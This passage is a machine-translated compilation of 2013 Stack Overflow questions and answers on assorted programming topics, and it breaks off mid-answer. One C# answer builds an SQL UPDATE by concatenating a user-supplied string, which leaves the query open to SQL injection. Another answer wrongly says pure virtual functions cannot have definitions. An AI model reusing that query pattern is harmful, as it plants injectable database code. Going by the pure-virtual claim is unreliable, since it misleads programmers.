> 赞同：1
> 
> 时间：2013-03-01T09:43:53.297
> 
> 标签：adobe-indesign, idml

我正在尝试从 IDML 文件中提取文本内容。

我目前正在做的是-

1.  提取 xml 文件，转到`designmap.xml`文件并查找构成文档的价差。

2.  Spreads 是 designmap.xml 中的元素，定义为 ::

3.  在每个展开中，我查找元素，并从属性`<TextFrame>`中获取相应的内容`ParentStory`

问题是这个文本似乎没有顺序。我有一个简单的 IDML 文件，其中我有一个标题文本框，一个文本框覆盖页面的内容。当我提取时，首先提取正文部分，然后提取标题。

有什么方法可以按照我们可以看到的相同顺序提取内容？

谢谢。

PS - 在元素中，NextFrame 和 PreviousFrame 属性都设置为“n”。我不确定这意味着什么，这些价值观是否能有所帮助。抱歉，如果我在这里遗漏了一些非常基本的东西，我是设计和 IDML 的新手。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T18:23:28.277

`TextFrame`IDML中元素的顺序`Spread`表示它们的 z 顺序深度，而不是页面上的任何阅读顺序。在您描述的文档中，要么操纵了深度，要么在标题之前将正文元素添加到文档中：无论哪种方式，它的深度都较低。

以我认为您想要的方式确定阅读顺序的唯一方法是找出页面上元素的位置（大概一旦您知道这一点，您就可以从上到下和/或从左到右，甚至从右到左工作取决于语言）。这可能有点棘手，但基本上是 >> 层次结构的和参数`GeometricBounds`的`ItemTransform`总和。有关更多详细信息，请参见我的答案：[https ://stackoverflow.com/a/12490600/1014822](https://stackoverflow.com/a/12490600/1014822)`Spread``Page``PageItem`

或者，如果您可以控制文档创作过程，您可以确保作者使用深度来指示阅读顺序，这将为您节省一些编码。但请注意，IDML 也有`Layer`s 的概念，这使深度问题进一步复杂化。

`NextTextFrame`并且`PreviousTextFrame`仅用于链接框架，当故事从一个框架流向另一个框架时。值`N`表示该方向上没有链接框架。

# jquery - jQuery 用于在文本框中摇动文本

> ID：15154679
> 
> 赞同：1
> 
> 时间：2013-03-01T09:44:00.773
> 
> 标签：jquery, textbox, shake

当验证失败时，我想为文本框中的文本提供抖动效果。有人可以建议相同的jQuery代码吗？

这是一个显示确切要求的链接。[点击这里](https://www.slideshare.net/signup/)

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:53:44.147

可能正在做类似的事情

```
function shakeText(selector){
    $(selector).animate({'padding-left' : '5'} , 1000 , function(){
        $(selector).animate({'padding-left' : '0'} , 1000)}
);

}
shakeText('#element') 
```

这是一个[jsfiddle](http://jsfiddle.net/KDaA4/)

# c++ - 将调用与共享指针链接在一起

> ID：15154688
> 
> 赞同：3
> 
> 时间：2013-03-01T09:44:25.453
> 
> 标签：c++, boost, shared-ptr

这可能是一个“最佳实践”问题，但我想确保我以正确的方式进行。

我有以下课程：

```
typedef boost::shared_ptr<MyClass> MyClassPtr;

class MyClass final : public boost::enable_shared_from_this<MyClass> {
public:
    /* ctors/dtor ommitted */

    MyClassPtr method1() {
         // does something
         return shared_from_this();
    };

    MyClassPtr method2() {
         // does something
         return shared_from_this();
    };

}; // eo class MyClass 
```

这是因为我想轻松地将调用链接在一起：

```
MyClassPtr ptr(myClassFactory.createMyClass());

ptr->method1()->method2()->methodX();  // etc... 
```

这是`shared_from_this()`成语的合适用途吗？有什么我不知道的陷阱，还是有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:51:15.510

函数调用链接通常通过返回对对象的引用来完成：

```
MyClass& method1() {
     // does something
     return *this;
}; 
```

使用`shared_ptr`to 意味着您希望唯一的用途是`MyClass`将其包裹在`shared_ptr`. 事实上，如果有人创建了一个`MyClass`具有自动存储持续时间的对象并调用了您的某个方法，那么您将遇到问题，因为当返回的对象`shared_ptr`被销毁时，它会尝试访问`delete`您的对象。当然，您不能`delete`使用自动存储持续时间的对象。

我通常认为`enable_shared_from_this`只有当你的类提供一个静态工厂函数来`shared_ptr`为自己生成 s 并且它的构造函数是私有的时才应该使用它。这可以防止任何人创建具有自动存储持续时间的此类对象。

尽管如此，如果他们要进行函数链接，大多数人会*期望对对象的引用。*那么至少他们可以这样做：

```
MyClass foo;
foo.method1().method2(); 
```

代替：

```
MyClass foo;
foo.method()->method2(); 
```

# python - svm.sparse.SVC 花费大量时间来接受培训

> ID：15154690
> 
> 赞同：2
> 
> 时间：2013-03-01T09:44:31.720
> 
> 标签：python, svm, scikit-learn

我正在尝试在 scikit-learn 中训练 svm.sparse.SVC。目前特征向量的维数约为 70 万，用于训练的特征向量数量为 20k。我使用 csr 稀疏矩阵提供输入，因为每个特征向量中只有大约 500 个维度是非零的。该代码自过去 5 小时以来一直在运行。有没有估计需要多少时间？有什么方法可以更快地进行训练吗？内核是线性的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T10:19:18.163

尝试使用`sklearn.svm.LinearSVC`. 这也有一个线性内核，但底层实现是`liblinear`，已知它更快。考虑到这一点，您的数据集并不是很小，因此即使是这个分类器也可能需要一段时间。

* * *

在第一条评论后编辑：我认为您有多种选择，但都不是完美的：

*   非解决方案选项：收工并希望`svm.sparse.SVC`明天早上的培训已经完成。如果可以的话，买一台更好的电脑。
*   作弊选项：放弃概率。你还没有告诉我们你的问题是什么，所以它们可能不是必需的。
*   背靠墙选项：如果您绝对需要概率并且事情必须运行得更快，请使用不同的分类器。选项包括`sklearn.naive_bayes.*`, `sklearn.linear_model.LogisticRegression`。等等。这些训练起来会快得多，但你付出的代价是降低了准确性。

# cluster-computing - 如何在具有 2 个计算节点和 1 个头节点的扭矩集群中运行数据包捕获程序？

> ID：15154692
> 
> 赞同：0
> 
> 时间：2013-03-01T09:44:36.057
> 
> 标签：cluster-computing, jobs, pbs, qsub, torque

我使用带有 2 个计算节点和 1 个头节点的扭矩 pbs 配置了一个集群。我使用 qsub 命令（如 qsub myscript.sh）提交了作业

myscript.sh 包含一些 shell 代码。该脚本在任何计算节点中都成功执行，结果我得到了一些输出文件。这种类型的作业提交和执行非常容易。但是我在以下方面面临很多问题......

我有一个用 C 语言编写的带有 libpcap 依赖项的网络数据包捕获模块。我的要求是这样的。我想将此程序提交到不同的计算节点（computenode-0-0，computenode-0-1）。因此，无论所有数据包都到达头节点，这些数据包都将由我在计算节点中运行的程序处理。

我将如何提交 C 程序？计算节点如何进行负载均衡？我必须在集群中做哪些额外的配置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T20:19:01.590

This is a pretty broad question that I don't think can be answered with the information provided. Hopefully I can help at least a little bit.

Q: How do you submit the c program? A: Looks like you already submitted it correctly, [ qsub someProgram.sh -l walltime=x....] If you want to interact with the program while it is running, then look at interactive jobs. [http://docs.adaptivecomputing.com/torque/2-5-12/help.htm#topics/commands/qsub.htm](http://docs.adaptivecomputing.com/torque/2-5-12/help.htm#topics/commands/qsub.htm)

Q: How is load balancing done on the compute node? A: Torque does not do any load balancing (exception is mom hierarchy ). Here is the life cycle of a job: 1\. job is sent to pbs_server from the submit host 2\. pbs_server sends the script to 1 of the nodes (called the mother superior) 3\. The mother superior executes the script and queries the other nodes through the TM interface. (The job does not actually run on every node)

Q: What configuration do you have to do in the cluster? A: Too vague.

# function - 纯虚函数可以有定义或返回类型“void”吗？

> ID：15154700
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:44:45.960
> 
> 标签：function, pure-virtual

我的问题是：

纯虚函数可以有返回类型 VOID 吗？/或者你可以纯虚函数只能有一个返回类型“VOID”是真的吗？

第二个问题是：纯虚函数可以有定义吗？或者一个纯虚函数可以有定义是真的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T02:41:49.187

是的，纯虚函数可以返回 void。

不，纯虚函数不能有定义。“纯虚拟”中的“纯”表示它没有默认定义。

# debugging - 为什么不在 Salesforce 中查看由 System.debug() 方法生成的调试行？

> ID：15154703
> 
> 赞同：1
> 
> 时间：2013-03-01T09:44:50.743
> 
> 标签：debugging, salesforce, apex-code

我为生产系统创建了一个可批处理的类。如果以下代码不起作用，则任何代码都不起作用。

该代码现在在生产系统中。它每天从一个站点获取每日汇率并创建 Currency__c 记录。如果它在汇率尚未公布时有效，则需要最后一天的汇率。但它不能按我想要的方式工作，我想在调试日志中对其进行测试。

当我查看调试日志时，从未调用过以下方法“ **getXML(Date today) ”。**因此**System.debug('test: ' + result);** 也从未调用过。

我怎样才能看到这个日志？

```
public String getXML(Date today){  
    counter += 1;       
    if(counter == 11) return '';
    try{
        Http h = new Http();
        HttpRequest req = new HttpRequest();       

        String m = today.month() + '';
        if((today.month()+'').length()==1) m = '0' + today.month();
        String d = today.day() + '';
        if((today.day()+'').length()==1) d = '0' + today.day();
        String donem = today.year() + '' + m;
        String formattedDate = d + '' + m + today.year();

        req.setEndpoint('http://www.tcmb.gov.tr/kurlar/' + donem + '/' + formattedDate + '.xml'); 
        req.setMethod('GET');            
        String result = '';
        if (!Test.isRunningTest()){
            HttpResponse res = h.send(req);
            result = res.getBody();
        }
        else {
            result += 'test';
        }         
        System.debug('test: ' + result);
        if(res.getStatusCode()==404){
            return getXML(today.addDays(-1));
        }   
        return result;
    }catch(Exception e){
        return getXML(today);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-06T19:53:21.683

如果我理解您的问题，那就是“您有一些带有调试语句的代码。如果您自己运行此代码，您会看到这些语句。如果您将它作为更大测试的一部分运行，则不会出现调试语句；引导您认为这些行动没有发生”。

[我遇到了类似的问题并在我的博客http://sforcehacks.blogspot.ca/2014/01/debug-statements-stopped-working-on.html](http://sforcehacks.blogspot.ca/2014/01/debug-statements-stopped-working-on.html)上讨论了它

本质上，当跟踪文件的总大小变得太大时，Salesforce 似乎会放弃调试语句；即使是那些要在错误级别记录的。

在您的情况下，我不会依赖调试语句来跟踪批处理过程中发生的事情。而是在每次调用 getdate 方法时创建一个临时对象（表）并在其中存储一条记录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T05:53:28.303

如果您打开了开发人员控制台，它应该会捕获正在运行的批处理的日志。

[或者，尝试按照Monitor Debug Logs](http://login.salesforce.com/help/doc/en/code_monitoring_debug_logs.htm)下的步骤操作：

> 要查看保存的调试日志，请单击**您的姓名 | 设置 | 监控 | 调试日志。**
> 
> 在此页面中，单击新建以指定您要为其保留调试日志的用户。
> 
> 开始保留调试日志后，您可以：
> * 单击查看以查看特定日志的详细信息。
> * 单击下载以将调试日志下载为 XML 文件。

我发现让一些批处理作业在完成时发送一封带有 BatchableContext 状态的电子邮件很有帮助 - 请参阅[在 Batch Apex 完成时发送通知](http://www.fishofprey.com/2012/03/salesforce-sending-notification-when.html)。

最后，您的异常处理可能会根据导致异常的原因创建递归循环。我想这就是要`counter`防范的。一种可能性是在代码到达预期的调试行之前发生异常。尝试在异常处理中放置一个调试行`LoggingLevel.Error`作为第一个参数。

如果由于日志变得太大而无法看到日志消息，请尝试降低日志级别并将重要的日志消息更改为 INFO 或 ERROR 级别。

例如

```
} catch(Exception e) {
    System.debug(LoggingLevel.Error, 'Exception:' + e);
    return getXML(today);
} 
```

# javascript - 在 IE ≤ 8 中更改幻灯片时 Nivo-Slider 消失

> ID：15154704
> 
> 赞同：4
> 
> 时间：2013-03-01T09:44:50.627
> 
> 标签：javascript, internet-explorer-8, cross-browser, nivo-slider

我正在测试滑块，它在 Chrome 和 IE 9+ 中工作，但在早期版本中不能正常工作。

我遇到的问题是，当上一张幻灯片被卷起时，会显示一个类似错误的图像（然后 loading.gif 可见）并保持两秒钟以上，直到出现下一张幻灯片。
我尝试更改动画类型，但问题仍然存在。

我应用[了这个](https://stackoverflow.com/a/9154894/75500)答案并没有解决问题。

有什么线索吗？

我也在[dev7studios](http://goo.gl/hK6O4)上发布了同样的问题，但是没有答案。

![在此处输入图像描述](../Images/6b94a7fd305c8d3b92078a04b4181aa4.png)

**更新** 这是生成图像的方法：

```
private static MvcHtmlString BuildImageTag(string blobName, object htmlAttributes = null, string name = null)
{
  TagBuilder tag = new TagBuilder("img");

  var src = BlobHelper.GetBlobUri(blobName);

  tag.Attributes.Add("src", src.ToString());
  tag.Attributes.Add("name", name);
  if (htmlAttributes != null)
    tag.MergeAttributes(new RouteValueDictionary(htmlAttributes), true);

  return MvcHtmlString.Create(tag.ToString(TagRenderMode.Normal));
} 
```

如何更改它以使结束标签是单独的（如[本](https://stackoverflow.com/a/16038391/75500)答案中所述）？

## 更新 2

启用 JS 调试后，我看到 nivo 滑块 js 文件中有一个调试器中断。

![在此处输入图像描述](../Images/2b09df69e3a5d18caab023383d657ce0.png)

JS中的行是：

```
u.attr("src",i.currentImage.attr("src")).show(); 
```

我什至不确定它是否相关，但我认为它可能会有所帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-16T13:27:35.717

在您页面的源代码中，我看到：

```
<img name="ImageFileName" src="https://levelblob.blob.core.windows.net/levelblob/images/slides/b0624213-f3cd-4e0f-b1ae-e5e97429b087.jpg" title=""></img> 
```

这不是 W3C 指定的有效 img 标签：

> 标签是空的，这意味着它只包含属性，没有结束标签。

顺便说一句，`alt`标准需要一个属性，但是，没有浏览器会抱怨这一点。

所以在你的情况下，你应该重写你所有的img标签如下：**{没有'/'在img标签的末尾，当然没有''结束标签}**

```
 <img name="ImageFileName" src="..." title="" alt=""> 
```

加注提示仍然来自 W3C：

> 提示：最好同时指定图像的高度和宽度属性。如果设置了这些属性，则在加载页面时会保留图像所需的空间。但是，如果没有这些属性，浏览器将不知道图像的大小。效果将是页面布局将在加载期间更改（同时加载图像）。

不确定您的问题来自这里，但我确信无效的 html 会导致一些问题。

**更新**

在您更新之后，我看到您正在使用 (asp) 来呈现 html。您应该在函数结束时尝试此操作：

```
return MvcHtmlString.Create(tag.ToString(TagRenderMode.StartTag)); 
```

PS：我无法测试任何 asp 代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-10T16:15:23.073

该网站是用 HTML 5 编写的吗？

我最近将它实现到我创建的一个网站中，它在 IE 8 和 IE 7 中都能完美运行。我创建的网站是用 HTML 5 编写的，为了使滑块工作，我唯一更改的是更改 div 标签围绕滑块到部分，然后添加[HTML 5 shiv](https://code.google.com/p/html5shiv/)其他一切都是从网站上库存的。

这是我创建的有效[网站，所以希望这也能帮助你](http://computing.bournemouth.ac.uk/i7747061/assignment2/index.html)

（没有 50 个代表，所以不能将此作为评论发布）

# ruby - 我想在多语言的 Rails 网站上创建 ruby

> ID：15154706
> 
> 赞同：0
> 
> 时间：2013-03-01T09:44:56.157
> 
> 标签：ruby, internationalization, ruby-on-rails-3.2, rails-i18n

我在带有 psql 的 rails 3.2 上使用 ruby​​。目前我的网站是英文的。现在我想用多种语言创建它。我的网站是一种 CMS。所有页面和页面链接都在表格中。所以我很困惑如何将数据从英语转换为法语或德语。我不会使用任何 yml 文件。

帮我 ：（

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:58:58.770

你应该看看[globalize2](https://github.com/joshmh/globalize2)插件。您应该能够翻译您的记录。

# windows - 在 Windows 上构建 Hadoop：branch-1-win

> ID：15154707
> 
> 赞同：0
> 
> 时间：2013-03-01T09:44:59.807
> 
> 标签：windows, hadoop

是否有人基于代码存储库的`branch-1-win`分支发布了非专有（即不是 Hortonworks/Cloudera/Greenplum）Apache Hadoop 发行版？`hadoop-common`或者，有没有人能够在 Mac 上构建这个分支？

我正在尝试让*vanilla* Apache Hadoop 在 Windows 上工作，而无需使用 Cygwin。所有的修复似乎都已经完成，因为 Hortonworks 已经将它们反向移植到他们的发行版中，并且该分支充满了所有应用的补丁。我正在努力让构建工作（过多的问题，太多以至于无法提出 SO ！），所以我真的希望其他人有他们已经发布的功能构建。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T09:59:50.167

`branch-1-win`您必须在 Windows 上构建。它需要使用 MSBuild 工具，该工具与 .NET 4 或 Visual Studio C++ 一起提供。您还需要 Ant、Python 2.7、Perl 和 Apache Forrest。

# php - 如何从 mediawiki 扩展中获取 http 标头？

> ID：15154711
> 
> 赞同：1
> 
> 时间：2013-03-01T09:45:06.133
> 
> 标签：php, mediawiki

**问题**

我想从媒体 wiki 扩展中检查 http 标头。具体来说，如果其中一个标题存在，我将采取行动。

**背景**

我是 php 和 mediawiki 的新手。我正在研究我在 mediawiki 中的第二个扩展。如果特定的 http 标头是页面请求的一部分，我想采取特定的操作。我现在确信钩子在正确的时间被调用，但不幸的是我似乎无法掌握 http 标头。

```
$extensionObject = new MyExtension;
$wgHooks['ArticlePageDataBefore'][] = array($extensionObject, 'onArticlePageDataBefore');

class MyExtension{
    public function onArticlePageDataBefore( &$article, &$fields ) {
        $headers =mygetallheaders();
        ...do something with the headers
        return true;
    }
    public function mygetallheaders()   {
        ...this is the function I am trying to write
        return $headers;
    } 
```

**软件栈**

*   媒体维基：1.20.2
*   PHP: 5.3.3 (apache2handler)
*   MySQL：5.1.61

**到目前为止都试过了。**

以下两个方法都返回一个空数组

*   apache_request_headers
*   获取所有标题

$_SERVER 变量为空

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-04T21:32:11.150

```
public function onArticlePageDataBefore( &$article, &$fields ) {
    global $wgRequest;
    if ( $wgRequest->getHeader( 'My-Cool-Header' ) == 42 {
            PROFIT!
    }
    return true;
} 
```

# c# - 使用数据库中的字符串更新数据库中的表？

> ID：15154712
> 
> 赞同：0
> 
> 时间：2013-03-01T09:45:17.980
> 
> 标签：c#, sql, winforms

我正在尝试使用列表框中的字符串更新数据库的一列，该字符串与数据库中的字符串完全匹配，但它仅适用于没有空格的字符串。例如，如果我在列表框中有类似“Iphone”的产品，我会得到该字符串并传递给下面的 Update() 方法，它可以工作。但是，如果我使用“Samsung Galaxy S3”作为从列表框中选择的项目，Visual Studio 会向我抛出没有这样的行的错误。

我确信这是因为那个词之间的空格。我该如何解决这个问题。

**更新数据库的代码**

```
 public string Update(string product)
            {
                // Create connection object
                int ix = 0;
                string rTurn = "";
                OleDbConnection oleConn = new OleDbConnection(connString);
                try
                {
                    oleConn.Open();
                    string sql = "UPDATE [Product] SET [Quantity]=[Quantity] - 1 " + " WHERE [Product Name]= " + product;
                    OleDbCommand oleComm = new OleDbCommand(sql, oleConn);

                    oleComm.Parameters.Add("@product", OleDbType.Char).Value = product;

                    ix = oleComm.ExecuteNonQuery();
                    if (ix > 0)
                        rTurn = "Stock Updated";
                    else
                        rTurn = "Update Failed";
                }
                catch (Exception ex)
                {

                }
                finally
                {
                    oleConn.Close();
                }
                return rTurn;
            } 
```

**将每个项目的字符串传递给 Update() 方法的代码。**

```
public void UpdateStock()
        {
            foreach (var listBoxItem in listBox1.Items)
            {
                string result = Update(listBoxItem.ToString());
            }
        } 
```

![在此处输入图像描述](../Images/1cee38aa92329dfa329697381ae7cb26.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:51:15.800

尝试改变

```
string sql = "UPDATE [Product] SET [Quantity]=[Quantity] - 1 " + " WHERE [Product Name]= " + product; 
```

到

```
string sql = "UPDATE [Product] SET [Quantity]=[Quantity] - 1 WHERE [Product Name]= ?"; 
```

您正在添加参数`@product`，但您没有使用它。连接查询不是一个好的做法，它会让您容易受到 SQL 注入攻击。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:49:35.740

```
string sql = "UPDATE [Product] SET [Quantity]=[Quantity] - 1 " + " WHERE [Product Name]= '" + product + "'"; 
```

试试这个:)

您需要将产品标识为字符串:)

# php - 来自 PHP 文件的 ajax 响应

> ID：15154717
> 
> 赞同：0
> 
> 时间：2013-03-01T09:45:27.100
> 
> 标签：php, jquery, ajax

我有点白痴，似乎无法找到我的问题的答案，我想向我的 PHP 文件发送搜索请求并返回结果，当我这样做时，我似乎无法做到正确的事情，我肯定使用了正确的文件，但我不确定如何从 PHP 文件返回结果（我对 ajax 相当陌生，所以我为听起来很愚蠢而道歉）

jQuery/Ajax：

```
 $('#searchGo').click(function() {
        var tempVar = 0;
        var request = $.ajax({
            async: false,
            url: "/../commerce/search.php",
            type: "POST",
            data: "search=" + $('#search').val(),
            dataType: "html"
        });
        alert(request.responseText + ' test');
    }); 
```

搜索.php：

```
if(isset($_POST['search'])) {
    return 'yes';
}
return 'no'; 
```

并且响应文本没有给我任何东西，我做错了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:46:52.857

你`echo`不想`return`。

JS 正在读取 HTTP 响应。因此，您需要响应一些数据，而不仅仅是将其返回给调用 (PHP) 函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:46:40.520

而不是返回，调用

采用

```
if(isset($_POST['search']))
{
    echo 'yes';
}
else
{
    echo 'no';
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T09:46:57.740

use `echo`, 在你使用的函数中`return`

```
if(isset($_POST['search'])) {
    echo 'yes';
}
echo 'no'; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T09:47:47.830

试试这个 ：

```
if(isset($_POST['search'])) {
    echo 'yes';
}
echo 'no'; 
```

# macos - 如何在 Mac OS X 中从其他应用程序的沙箱中读取文件？

> ID：15154718
> 
> 赞同：1
> 
> 时间：2013-03-01T09:45:28.473
> 
> 标签：macos, sandbox

我的应用程序中的文本输入视图支持拖放图像以插入它们。当用户在输入视图中放置图像时，我可以获得文件的绝对路径，然后将其显示为附件。但是，当用户拖动最初位于另一个应用程序沙箱中的图像时，我的应用程序似乎没有足够的权限来读取它。

有没有办法从其他应用程序的沙箱中读取文件？（如请求用户许可或其他技巧）

# c# - 我可以从 Windows 服务的另一个线程中打开更多线程吗？

> ID：15154719
> 
> 赞同：0
> 
> 时间：2013-03-01T09:45:31.583
> 
> 标签：c#, multithreading, cpu

我可以从线程内部打开一些线程吗？

我有一个具有 2 个不同角色的 Windows 服务。服务启动时，我打开 2 个线程：每个角色一个。在每个线程中我需要打开子线程。

我可以为每个核心打开多少个线程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:48:34.900

当然，您可以从一个线程实例化其他线程 - 至于有多少这可能证明有用：[每个内核的最佳线程数](https://stackoverflow.com/questions/1718465/optimal-number-of-threads-per-core)

值得记住的是，线程有其自身的成本，并且添加线程以提高性能只能在一定程度上起作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:48:38.070

没有硬性限制……只要框架有足够的资源和空闲句柄等。过去我的一个应用程序在峰值运行了大约 150 个线程。

在生成线程中，我们过去常常根据需要生成更多线程，用于执行我们需要处理的任务。

一段时间后，我们开始使用 ThreadPool，因为它占用的资源较少，并且在应用启动时分配了 1024 个线程

请记住操作系统调度程序调度活动时的每个线程，并且您是否想要许多热线程。因此，当什么都不做时，要么让这些线程进入睡眠状态，要么如果使用 ThreadPool 只需退出当前迭代以将线程释放回池中

对于 .NET Framework，这些值得一读

**线程和线程**

[http://msdn.microsoft.com/en-us/library/6kac2kdh.aspx](http://msdn.microsoft.com/en-us/library/6kac2kdh.aspx)

**使用线程和线程**

[http://msdn.microsoft.com/en-us/library/e1dx6b2h.aspx](http://msdn.microsoft.com/en-us/library/e1dx6b2h.aspx)

话虽如此，请注意您创建的内容。你可能需要担心线程安全、锁定、同步，但是你想怎么写。调试应用程序也变得更加困难

# kettle - pentaho水壶报错原因

> ID：15154731
> 
> 赞同：0
> 
> 时间：2013-03-01T09:46:20.113
> 
> 标签：kettle

在执行工作时，在 Pentaho 水壶中，我重复收到以下消息：

> 13/03/01 15:12:47 - 测试 - 作业执行开始
> 2013/03/01 15:12:47 - 转换元数据 - 共享对象文件 [null] 为空！
> 2013/03/01 15:12:47 - 转换元数据 - 共享对象文件 [null] 为空！
> 2013/03/01 15:12:47 - 转换元数据 - 共享对象文件 [null] 为空！
> 2013/03/01 15:12:47 - 转换元数据 - 共享对象文件 [null] 为空！

但工作仍在运行

# c# - 测试 WCF Web 服务？

> ID：15154735
> 
> 赞同：23
> 
> 时间：2013-03-01T09:46:32.140
> 
> 标签：c#, visual-studio-2010, wcf, web-services

我想为 WCF 服务创建一个测试类。我相信“嘲笑”是正确的术语吗？

我不确定我认为我必须这样做的方式是正确的方式。我获得了 WCF 服务的 URL，例如：

```
http:://somesite.com/wcf/RealService.svc 
```

和：

```
http:://somesite.com/wcf/RealService.svc?wsdl 
```

因此，我没有将 实际添加`RealService.svc`到我的项目中，而是在我的项目中`Service Reference`添加了一个`WCF Service`名为`Service1`.

然后我想使用`wsdl.exe`（或者可能是 svcutil.exe？）工具从 WSDL url: 生成一个接口`http:://somesite.com/wcf/RealService.svc?wsdl`。

然后我打开`Service1.cs`文件，而不是让继承自我`IService1.cs`让它从生成的`interface`.

然后我没有在我的应用程序中调用真正的服务，而是简单地调用我的`Service1`类。这就是模拟 Web 服务的工作原理吗..？

还需要弄清楚如何`interface`使用 svcutil 工具实际生成一个（我读过我不能将 wsdl.exe 用于 WCF 服务？）。因此，任何关于这方面的提示也非常受欢迎！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-03-01T10:14:28.537

许多需要涉及的领域，将尝试为您指明正确的方向：

*   如果您想测试（即传递输入、验证输出）您的 WCF 服务，请使用 Visual Studio GUI 工具（[此处](http://msdn.microsoft.com/en-us/library/bb552364%28v=vs.90%29.aspx)`WCF Test Client`为MSDN 文章）。

*   如果您想模拟您的 WCF 服务（即对使用 WCF 服务的组件进行单元测试），请使用模拟框架`NMock2`，它允许您模拟服务接口（[此处](https://stackoverflow.com/questions/406955/easy-way-to-mock-a-wcf-service)为相关的 SO 线程）。如果您不想使用外部框架，您也可以手动编写模拟代码（通过实现接口） - 但这涉及更多。

*   如果您想对您的 WCF 服务进行单元测试（即为服务、业务、数据等编写单元测试），请使用流行的模拟框架（相关的 SO 线程[在这里](https://stackoverflow.com/questions/37359/what-c-sharp-mocking-framework-to-use)）。

*   要为您的 WCF 服务生成代理，请按照您的猜测使用 svcutil.exe 命令行实用程序（[此处为 MSDN 文章）。](http://msdn.microsoft.com/en-us/library/aa347733%28v=vs.90%29.aspx)该实用程序带有各种选项（语言、命名空间、配置文件等），因此请注意它们。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T11:49:23.007

您可以使用**svcutil.exe**生成代理（来自 Visula Studio：**添加服务参考...**）。这将生成您的客户端代理和**服务接口**。

例如，您的服务 http://somesite.com/wcf/RealService.svc?wsdl 我们将获得：

*   IRealService（接口）
*   RealServiceClient（实现 IRealService 并扩展 System.ServiceModel.ClientBase）

您可以创建一个模拟类来实现您的服务接口 (IRealService)。

在您的应用程序中，当您想要调用您的服务时，您可以使用工厂或 IOC 容器，而不是实例化具体的服务客户端 (RealServiceClient)。

通过这种方式，您可以决定您的应用程序（或模块/组件）使用哪个实例：运行时的真实服务，测试时的模拟。

# iphone - 如何仅在 iOS 中使用相机计算对象的高度和宽度？

> ID：15154738
> 
> 赞同：7
> 
> 时间：2013-03-01T09:46:39.963
> 
> 标签：iphone, ios, camera

我想使用相机计算对象的高度和宽度。我曾尝试在 iphone 中寻找相机和物体之间的角度，我认为这将有助于获得物体尺寸！

有什么建议么？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T10:03:01.757

最好的方法是使用参考对象。这可以是一张纸或您的身份证，您知道其实际尺寸。将参考卡放在需要计算其尺寸的对象附近。拍摄两者的快照。以某种方式计算实际尺寸已知的卡片所覆盖的像素数（我在我的 iOS 应用程序中使用 openGL 使用它）。然后计算要查找尺寸的对象的像素数。比较这两个值，您可以使用公式来获取对象的高度和宽度。

以上是一种可能对您有所帮助的解决方案。否则，您需要计算物体和摄像头之间的距离（这在 iPhone 上是不可能的，因为它只有一个摄像头）然后继续。

# lua - 如何优雅地尝试在 Lua 中加载包？

> ID：15154740
> 
> 赞同：11
> 
> 时间：2013-03-01T09:46:41.160
> 
> 标签：lua, packages

我想尝试在 Lua 中加载一个包。该软件包现在`ansicolors`并且只是为了具有更好看的控制台输出。

这是糖，我不希望用户被迫安装这个包。

所以我尝试了类似的东西：

```
ansicolors = require 'ansicolors' or nil 
```

但正如我所想，它引发了一个未找到模块的错误并停止执行。

所以我的问题是：是否有一个优雅的解决方案来尝试加载包并在不可能时回退到更简单的解决方案？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-01T09:57:18.730

```
local status, module = pcall(require, 'ansicolors')
ansicolors = status and module or nil 
```

# c# - 从类型化数据集中访问存储过程

> ID：15154742
> 
> 赞同：0
> 
> 时间：2013-03-01T09:46:45.697
> 
> 标签：c#, ado.net, dataset, strongly-typed-dataset

嗨，我只是在学习使用类型化的 DataSet，我似乎找不到一个很好的例子来说明如何使用存储过程来使用它们。

到目前为止，我设法创建 DataSet 添加表和存储过程。这是我所拥有的：

![在此处输入图像描述](../Images/f8d9505276e8c3316dc4e0a081bd23b5.png)

例如，如果我想使用 GetBooks 存储过程，则必须传递两个参数。我尝试过这样做：

```
BooksAndCategoriesDataSet context = new BooksAndCategoriesDataSet();
context.GetBooks(1 , 5) 
```

但正如你们已经知道的那样，这是行不通的。

那么如何在我的代码中使用类型化数据集中的任何存储过程呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:57:46.877

首先右键单击`DataSet`并执行`Add -> Query -> Select stored procedure`（记住从存储过程返回的查询应该匹配`DataSet`），或者您可以从 Visual Studio 中拖放存储过程`Server Explorer`（这将解析存储过程返回的查询并`DataSet`相应地创建）。这也将创建 2 个类：`<DataSetName>TableAdapter`和`<DataSetName>DataTable`.

接下来要在代码中使用它，您必须使用 2 个不同的类：

```
var ta = new GetBooksTableAdapter();
var dt = new GetBooksDataTable();

ta.Fill(dt, 1, 5); //where 1 is first parameter, 5 is second. 
```

要访问从数据库返回的数据，请执行以下操作：

```
